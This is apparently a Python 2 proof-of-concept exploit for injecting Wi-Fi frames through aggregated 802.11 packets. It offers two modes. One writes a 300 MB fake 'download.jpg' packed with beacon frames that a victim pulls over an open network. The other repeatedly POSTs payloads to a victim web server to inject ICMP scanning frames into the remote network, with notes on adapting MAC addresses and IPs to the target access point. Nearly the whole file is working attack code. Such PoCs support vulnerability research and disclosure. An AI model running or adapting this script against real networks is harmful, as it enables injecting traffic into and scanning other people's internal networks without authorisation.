#!/usr/bin/env python2

from rpyutils import printd, Color, Level, clr, VERBOSITY
from packets import AMPDUPacket, AMSDUPacket, ping_packet, arp_packet, tcp_syn, ssid_packet, probe_response
import requests
import random
import sys


class MaliciousDownload():
    def __init__(self, package):
        self.data = str(package)

    def write(self):
        with open('download.jpg', 'w') as f:
            for i in range(0, 10000):
                f.write(("\x00" * random.randint(0, 3)) + str(self.data))


def fuzztf(option1, option2):
    test = random.randint(0, 1)
    if test:
        return option1
    else:
        return option2


def main_download():
    # Malicious download
    raw_input("This will create a 300 MB file download.jpg in the working directory. Press any key to continue or CTRL+C to exit.")
    printd(clr(Color.YELLOW, "Creating malicious download..."), Level.INFO)
    container = ""
    for i in range(0, 256):
        # Containers are (series of) frames to inject into the remote network
        # Container for scanning hosts on internal network
        #md_pkt = AMPDUPacket('ff:ff:ff:ff:ff:ff', '4C:5E:0C:9E:82:19', '4C:5E:0C:9E:82:19', 0x02)
        #md_pkt.add_msdu(ping_packet(i, "10.0.0.1", "192.168.88.249"))
        #md_pkt.add_padding(8)

        # Container for a Beacon frame
        md_pkt = ssid_packet()

        container += str(md_pkt)

    md = MaliciousDownload(container)
    md.write()


def main():
    session = requests.Session()
    count = 1
    ip_count = 0

    printd(clr(Color.BLUE, "Building container..."), Level.INFO)
    """ Build container """
    container = ''
    for i in range(0, 800):
        count = (count + 1) % 1024
        ip_count = (ip_count % 255) + 1

        # Ping from attacker --> victim
        # You need to change the MAC addresses and IPs to match the remote AP
        ampdu_pkt = AMPDUPacket('ff:ff:ff:ff:ff:ff', '64:D1:A3:3D:26:5B', '64:D1:A3:3D:26:5B', 0x02)
        ampdu_pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
        ampdu_pkt.add_padding(8)
        container += str(ampdu_pkt)

        # Beacon from attacker --> victim
        #ampdu_pkt = ssid_packet()
        #container += str(ampdu_pkt)

        # Ping from victim --> access point
        #ampdu_pkt = AMPDUPacket('4C:5E:0C:9E:82:19', 'f8:1a:67:1b:14:00', '4C:5E:0C:9E:82:19')
        #ampdu_pkt.add_msdu(ping_packet(count, "192.168.88.254", "10.0.0." + str(ip_count)))
        #ampdu_pkt.add_padding(8)
        #container += str(ampdu_pkt)
    """ end package """
    printd(clr(Color.BLUE, "Finished building container! Sending..."), Level.INFO)

    while 1:
        print("."),
        sys.stdout.flush()
        request_params = {'postpayload': ("\x00" * random.randint(0, 3)) + str(container)}
        try:
            session.post("http://" + "10.0.0.6:80" + "/index.html", files=request_params, timeout=5)
        except requests.exceptions.ConnectionError:
            printd(clr(Color.RED, "Could not connect to host"), Level.CRITICAL)
            pass
        except Exception:
            printd(clr(Color.RED, "Another exception"), Level.CRITICAL)
            pass

if __name__ == "__main__":
    try:
        pocnum = raw_input("Two PoCs are available. Suggested approach to test the vulnerability is to choose option 1"
                           " and upload the file to your web server. Then, download while connected to an _open_ "
                           "network and observe Wireshark output for MAC 00:00:00:00:00:00 in monitor mode. Waving "
                           "your hand over the antenna of the receiver can speed up the injection rate if you don't "
                           "want to wait too long to see the results.\n"
                           "\t1) Generate 300 MB .jpg file containing malicious Beacon frames (pulled by victim).\n"
                           "\t2) Connect to victim web server and POST malicious host scanning ICMP frames (push to victim).\n"
                           "Note: for option 2 you need to change the MAC addresses and IPs in the source to match the remote AP.\n"
                           "Choice: ")
        if pocnum == "1":
            main_download()
        elif pocnum == "2":
            main()
        else:
            printd("Invalid PoC number.", Level.CRITICAL)
    except KeyboardInterrupt:
        printd("\nExiting...", Level.INFO)